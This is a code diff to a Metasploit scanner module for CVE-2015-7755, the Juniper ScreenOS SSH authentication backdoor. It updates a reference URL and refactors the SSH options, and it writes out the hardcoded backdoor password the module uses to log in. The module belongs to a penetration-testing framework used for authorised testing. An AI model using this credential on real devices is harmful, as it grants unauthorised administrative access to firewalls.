@@ -23,7 +23,7 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'References'     => [
         ['CVE', '2015-7755'],
-        ['URL', 'https://blog.rapid7.com/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor'],
+        ['URL', 'https://www.rapid7.com/blog/post/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor/'],
         ['URL', 'https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10713']
       ],
       'DisclosureDate' => '2015-12-20',
@@ -41,15 +41,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-    factory = ssh_socket_factory
-    ssh_opts = {
+    ssh_opts = ssh_client_defaults.merge({
       :port            => rport,
       :auth_methods    => ['password', 'keyboard-interactive'],
       :password        => %q{<<< %s(un='%s') = %u},
-      :proxy           => factory,
-      :non_interactive => true,
-      :verify_host_key => :never
-    }
+    })
 
     ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
